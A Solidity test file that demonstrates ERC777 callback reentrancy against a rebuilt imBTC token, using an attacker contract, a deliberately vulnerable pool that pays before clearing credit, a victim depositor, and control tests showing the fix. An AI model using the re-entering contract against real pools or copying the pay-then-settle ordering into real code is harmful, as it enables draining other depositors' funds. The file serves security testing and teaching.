// SPDX-License-Identifier: MIT
pragma solidity 0.5.0;

// HZ-016: the token really does call the recipient back mid-transfer, and a counterparty
// that credits first and settles after paying can be re-entered.
//
// No forge-std: the verified imBTC source is solc 0.5.0 and a modern test library would
// force a second compiler into the same build. Everything runs against the rebuilt
// contract, so what is demonstrated is the deployed token and not a stand-in.
//
// imBTC resolves its hooks through the ERC1820 registry at its canonical address, so the
// registry's own runtime is etched to that address from the live chain (2501 bytes,
// sha256 50a56a9328a01aa001d63b6ba351d6c2144e63c8275cf1bdf54382f019f7bc94).
import "../src/IMBTC.sol";

// `etch` and `getCode` through a hand-written interface. The token is deployed with a bare
// `create` rather than `new IMBTC()` on purpose: forge 1.x rewrites `new <imported contract>()`
// into a form wrapped in `payable(...)`, and the conversion function `payable(x)` does not
// exist until solc 0.6, while this bundle is pinned at exactly 0.5.0.
interface Vm {
    function etch(address, bytes calldata) external;
    function getCode(string calldata) external returns (bytes memory);
}

// the bundle declares its own IERC777, so this is named differently on purpose
interface IToken777 {
    function send(address, uint256, bytes calldata) external;
    function granularity() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function enableTransfer() external;
    function mint(address, uint256, bytes calldata, bytes calldata) external;
}

interface IRegistry {
    function setInterfaceImplementer(address, bytes32, address) external;
    function getInterfaceImplementer(address, bytes32) external view returns (address);
}

contract PlainToken {                       // a hook-less ERC20, the control for the callback
    string public name = "plain";
    string public symbol = "PLN";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SettlingPool {
    address public token;
    bool hooks;                             // call send() (callback) or transfer() (no callback)
    bool settleFirst;
    mapping(address => uint256) public credit;

    constructor(address token_, bool hooks_, bool settleFirst_) public {
        token = token_;
        hooks = hooks_;
        settleFirst = settleFirst_;
    }

    function deposit(uint256 amount) public {
        PlainToken(token).transferFrom(msg.sender, address(this), amount);
        credit[msg.sender] += amount;
    }

    function withdraw() public {
        uint256 bal = credit[msg.sender];
        require(bal > 0, "nothing credited");
        if (settleFirst) {
            credit[msg.sender] = 0;         // effects before interactions
        }
        if (hooks) {
            IToken777(token).send(msg.sender, bal, new bytes(0));
        } else {
            require(PlainToken(token).transfer(msg.sender, bal), "transfer failed");
        }
        credit[msg.sender] = 0;
    }
}

contract Reenterer {                        // the attacker: takes the callback and re-enters
    SettlingPool pool;
    bool taken;                             // one re-entry, the shape the classic exploit takes
    uint256 public calls;                   // every time the token called back
    uint256 public reentries;               // every time it took the callback and went back in

    // the registry's rule is that each account is its own manager, so an account has to
    // register itself: a third party calling setInterfaceImplementer for it fails
    function register() public {
        IRegistry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
    }

    function arm(SettlingPool pool_) public { pool = pool_; }

    function depositAndWithdraw(uint256 amount) public {
        IToken777(address(pool.token())).approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw();
    }

    function withdraw() public { pool.withdraw(); }

    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        calls += 1;
        // re-enter only if there is still a credit to take: with a pool that clears the
        // credit before paying there is nothing left, and an unconditional re-entry would
        // revert on its own require rather than showing the ordering as the cause
        if (!taken && address(pool) != address(0) && pool.credit(address(this)) > 0) {
            taken = true;
            reentries += 1;
            pool.withdraw();                // the balance it just paid is not settled yet
        }
    }
}

contract Recorder {                         // bare evidence that the callback fires at all
    uint256 public calls;
    address public lastFrom;
    address public lastTo;
    uint256 public lastAmount;

    function register() public {
        IRegistry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
    }

    function tokensReceived(address, address from, address to, uint256 amount, bytes calldata, bytes calldata) external {
        calls += 1;
        lastFrom = from;
        lastTo = to;
        lastAmount = amount;
    }
}

contract Erc777CallbackReentry {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IRegistry constant registry = IRegistry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant RECIPIENT_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;

    bytes constant REGISTRY_RUNTIME = hex"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029";

    IMBTC token;
    address attacker;
    address victim;
    uint256 constant HUNDRED = 100e18;

    function deployToken() internal returns (IMBTC) {
        bytes memory code = vm.getCode("IMBTC.sol:IMBTC");      // the rebuilt creation code
        // The address has to be known before the constructor runs: the token registers itself
        // with the registry from its own constructor, and the registry insists the caller be
        // the account's manager - at construction time that is this contract, not the token.
        // So the manager entry is seeded for the predicted address first. Plain create (not
        // create2) because the verified settings compile for byzantium.
        address deployed;
        assembly { deployed := create(0, add(code, 0x20), mload(code)) }
        require(deployed != address(0), "token did not deploy");
        // the constructor registers the contract in the registry itself, so this entry is
        // the proof that the deployment really ran its constructor
        require(registry.getInterfaceImplementer(deployed, keccak256("ERC777Token")) == deployed,
                "token did not register itself");
        return IMBTC(deployed);
    }

    function setUp() public {
        // the token registers itself in the registry from its constructor, so the registry
        // has to be there first or the deployment reverts
        vm.etch(address(registry), REGISTRY_RUNTIME);
        token = deployToken();                     // the rebuilt deployed contract
        token.enableTransfer();                    // transferable is false at construction
        attacker = address(new Reenterer());
        victim = address(new Victim());
        Victim(victim).register();
        Reenterer(attacker).register();
        token.mint(attacker, HUNDRED, new bytes(0), new bytes(0));
        token.mint(victim, HUNDRED, new bytes(0), new bytes(0));
    }

    // the fingerprint the placard matches on corresponds to behaviour: sending to a
    // contract recipient really does call it, with the payer and amount it expects
    function test_theTokenCallsTheRecipientBackOnSend() public {
        Recorder rec = new Recorder();
        rec.register();
        Reenterer(attacker).arm(SettlingPool(address(0)));
        token.mint(address(this), HUNDRED, new bytes(0), new bytes(0));  // the token, held here
        token.send(address(rec), HUNDRED, new bytes(0));
        assert(rec.calls() == 1);                        // the callback is real
        assert(rec.lastTo() == address(rec));
        assert(rec.lastFrom() == address(this));
        assert(rec.lastAmount() == HUNDRED);
    }

    function test_aSettlingPoolIsDrainedAndTheOtherDepositorLosesOut() public {
        SettlingPool pool = new SettlingPool(address(token), true, false);
        Reenterer(attacker).arm(pool);
        Victim(victim).join(address(token), address(pool), HUNDRED);
        Reenterer(attacker).depositAndWithdraw(HUNDRED);
        assert(token.balanceOf(attacker) == 2 * HUNDRED);        // paid twice for one deposit
        assert(pool.credit(attacker) == 0);
        assert(token.balanceOf(address(pool)) == 0);             // nothing left for the victim
        assert(Reenterer(attacker).reentries() == 1);            // exactly one re-entry
        assert(Reenterer(attacker).calls() == 3);                // the mint, then the two sends
        assert(!Victim(victim).leave());                         // the honest depositor cannot exit
    }

    // only the ordering changes: settle the balance before paying and the same pool is safe
    function test_settlingBeforePayingMakesTheSamePoolSafe() public {
        SettlingPool pool = new SettlingPool(address(token), true, true);
        Reenterer(attacker).arm(pool);
        Victim(victim).join(address(token), address(pool), HUNDRED);
        Reenterer(attacker).depositAndWithdraw(HUNDRED);
        assert(token.balanceOf(attacker) == HUNDRED);            // paid once, as expected
        assert(Reenterer(attacker).reentries() == 0);            // the callback fired but found nothing
        assert(Victim(victim).leave());                          // and the victim exits whole
        assert(token.balanceOf(victim) == HUNDRED);
        assert(token.balanceOf(address(pool)) == 0);
    }

    // and with a hook-less token the identical pool at the identical ordering still holds
    function test_aHooklessTokenInTheSamePoolIsNotDrained() public {
        PlainToken plain = new PlainToken();
        plain.mint(attacker, HUNDRED);
        plain.mint(victim, HUNDRED);
        SettlingPool pool = new SettlingPool(address(plain), false, false);
        Reenterer(attacker).arm(pool);
        Victim(victim).join(address(plain), address(pool), HUNDRED);
        plain.approve(address(pool), HUNDRED);
        pool.deposit(HUNDRED);
        pool.withdraw();
        assert(plain.balanceOf(attacker) == HUNDRED);            // no callback, no double pay
        assert(Victim(victim).leave());
        assert(plain.balanceOf(victim) == HUNDRED);
    }
}

contract Victim {                           // an ordinary depositor with no idea about hooks
    SettlingPool pool;

    // registered as a recipient so that its failure to exit is caused by the empty pool,
    // not by ERC777's rule that a contract recipient must have an implementer
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external { }

    function register() public {
        IRegistry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
    }

    function join(address token, address pool_, uint256 amount) public {
        pool = SettlingPool(pool_);
        PlainToken(token).approve(pool_, amount);
        pool.deposit(amount);
    }

    function leave() public returns (bool ok) {
        (ok, ) = address(pool).call(abi.encodeWithSignature("withdraw()"));
    }
}
